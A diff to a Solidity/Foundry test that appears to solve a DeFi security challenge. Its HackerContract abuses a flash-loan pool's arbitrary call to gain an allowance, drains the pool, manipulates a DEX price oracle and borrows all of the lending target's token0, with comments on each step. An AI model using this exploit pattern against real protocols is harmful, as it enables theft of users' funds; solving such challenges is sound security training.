@@ -71,81 +71,18 @@ contract Challenge3Test is Test {
 
         //============================//
 
-        Exploit exploit = new Exploit();
+        HackerContract hackerContract = new HackerContract();
 
-        exploit.setAll(address(token0), address(token1), target);
-      
-        flashLoanPool.flashLoan(
-          address(exploit),
-          abi.encodeWithSignature(
-            "HackFlashLoan(address)", player
-          )
-        );
-        uint256 balance = token0.balanceOf(address(flashLoanPool));
-        token0.transferFrom(address(flashLoanPool), player, balance);
+        hackerContract.hack(token0, token1, flashLoanPool, oracleDex, target);
 
-        balance = token0.balanceOf(player);
-        token0.approve(address(target), balance);
-        target.depositToken0(balance);
-        target.borrowToken0(11000 ether);
-
-        balance = token0.balanceOf(player);
-        token0.approve(player, balance);
-        token0.transferFrom(player, address(exploit), balance);
-
-        exploit.hack();
-
-        ExploitExample exploit2 = new ExploitExample();
-        exploit2.setAll(address(token0), address(token1), target);
-        exploit.transferTo(address(exploit2));
-        exploit2.hack(13000 ether);
-
-        ExploitExample exploit3 = new ExploitExample();
-        exploit3.setAll(address(token0), address(token1), target);
-        exploit2.transferTo(address(exploit3));
-        exploit3.hack(14000 ether);
-
-
-        ExploitExample exploit4 = new ExploitExample();
-        exploit4.setAll(address(token0), address(token1), target);
-        exploit3.transferTo(address(exploit4));
-        exploit4.hack(15000 ether);
-
-        ExploitExample exploit5 = new ExploitExample();
-        exploit5.setAll(address(token0), address(token1), target);
-        exploit4.transferTo(address(exploit5));
-        exploit5.hack(16000 ether);
-
-        ExploitExample exploit6 = new ExploitExample();
-        exploit6.setAll(address(token0), address(token1), target);
-        exploit5.transferTo(address(exploit6));
-        exploit6.hack(17000 ether);
-
-
-        ExploitExample exploit7 = new ExploitExample();
-        exploit7.setAll(address(token0), address(token1), target);
-        exploit6.transferTo(address(exploit7));
-        exploit7.hack(18000 ether);
-
-        ExploitExample exploit8 = new ExploitExample();
-        exploit8.setAll(address(token0), address(token1), target);
-        exploit7.transferTo(address(exploit8));
-        exploit8.hack(19000 ether);
-
-        ExploitExample exploit9 = new ExploitExample();
-        exploit9.setAll(address(token0), address(token1), target);
-        exploit8.transferTo(address(exploit9));
-        exploit9.hack(20000 ether);
-        exploit9.transferTo(player);
+        // Print player and oracle balances
+        console.log("token0 player {}", token0.balanceOf(address(player)));
+        console.log("token1 player {}", token1.balanceOf(address(player)));
+        console.log("token0 oracle {}", token0.balanceOf(address(target)));
+        console.log("token1 oracle {}", token1.balanceOf(address(target)));
 
         vm.stopPrank();
 
-        console.log("token0 player {}", token0.balanceOf(address(player)));
-        console.log("token0 exploit {}", token0.balanceOf(address(exploit)));
-        console.log("token0 oracle {}", token0.balanceOf(address(target)));
-        console.log("token1 player {}", token1.balanceOf(address(player)));
-        console.log("token1 exploit {}", token1.balanceOf(address(exploit)));
-        console.log("token1 oracle {}", token1.balanceOf(address(target)));
         assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");
 
     }
@@ -155,76 +92,52 @@ contract Challenge3Test is Test {
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 ////////////////////////////////////////////////////////////*/
 
-contract Exploit is IInsecureDexLP {
-    IERC20 token0;
-    IERC20 token1;
-    BorrowSystemInsecureOracle borrowSystem;
-    InsecureDexLP dex;
-
+contract HackerContract {
     address public owner;
-	  mapping (address => uint256) token0Deposited;
 
     constructor() public payable {
         owner = msg.sender;
     }
 
-    function setAll(address zeroToken, address firstToken, BorrowSystemInsecureOracle borrow) public payable {
-        token0 = IERC20(zeroToken); 
-        token1 = IERC20(firstToken);
-        borrowSystem = borrow;
-    }
-
-    function HackFlashLoan(address player) public {
-        token0.approve(player, token0.balanceOf(address(this)));
+    function HackFlashLoan(address token0, address our_contract) public {
+        IERC20(token0).approve(our_contract, IERC20(token0).balanceOf(address(this)));
     }
 
 
-    function hack() public {
-        token0.approve(address(borrowSystem), token0.balanceOf(address(this)));
-        borrowSystem.depositToken0(token0.balanceOf(address(this)));
-        borrowSystem.borrowToken0(12000 ether);
-    }
+    function hack(
+        IERC20 token0,
+        IERC20 token1,
+        InSecureumLenderPool flashLoanPool,
+        InsecureDexLP oracleDex,
+        BorrowSystemInsecureOracle target
+    ) public {
+        // First we exploit the vulnerability of the FlashLoan contract
+        // Using the delegate call to approve an allowance to our favor
+        flashLoanPool.flashLoan(
+          address(this),
+          abi.encodeWithSignature("HackFlashLoan(address,address)", address(token0), address(this))
+        );
+        // Then we transfer to us all tokens0 from the FlashLoan contract
+        token0.transferFrom(address(flashLoanPool), address(this), 10000 ether);
 
-    function transferTo(address otherAddress) public {
-        uint balance = token0.balanceOf(address(this));
-        token0.approve(address(this), balance);
-        token0.transferFrom(address(this), otherAddress, balance);
-    }
+        /*  
+            Then we're going to swap all tokens0 for tokens 1
+            This way the dex used as oracle is going to be full of token0
+            Taking down the price of token0 in our favor
+        */
+        token0.approve(address(oracleDex), 10000 ether);
+        oracleDex.swap(address(token0), address(token1), 10000 ether);
+        // Now we only need 4 ether amount of token1 to get all tokens0 from the target
+        console.log("price:", oracleDex.calcAmountsOut(address(token0), 10000 ether));
 
-    function calcAmountsOut(address tokenIn, uint256 amountIn) external view returns(uint256 output) {
-        return 1000 ether;
-    }
-}
+        // Approve 4 ether of token1 and deposit into the target
+        token1.approve(address(target), 4 ether);
+        target.depositToken1(4 ether);
+        // Make the borrow of tokens0
+        target.borrowToken0(10000 ether);
 
-
-contract ExploitExample {
-    IERC20 token0;
-    IERC20 token1;
-    BorrowSystemInsecureOracle borrowSystem;
-    InsecureDexLP dex;
-
-    address public owner;
-	  mapping (address => uint256) token0Deposited;
-
-    constructor() public payable {
-        owner = msg.sender;
-    }
-
-    function setAll(address zeroToken, address firstToken, BorrowSystemInsecureOracle borrow) public payable {
-        token0 = IERC20(zeroToken); 
-        token1 = IERC20(firstToken);
-        borrowSystem = borrow;
-    }
-
-    function hack(uint amount) public {
-        token0.approve(address(borrowSystem), token0.balanceOf(address(this)));
-        borrowSystem.depositToken0(token0.balanceOf(address(this)));
-        borrowSystem.borrowToken0(amount);
-    }
-
-    function transferTo(address otherAddress) public {
-        uint balance = token0.balanceOf(address(this));
-        token0.approve(address(this), balance);
-        token0.transferFrom(address(this), otherAddress, balance);
+        // Tranfer all tokens to the player
+        token0.transfer(owner, token0.balanceOf(address(this)));
+        token1.transfer(owner, token1.balanceOf(address(this)));
     }
 }
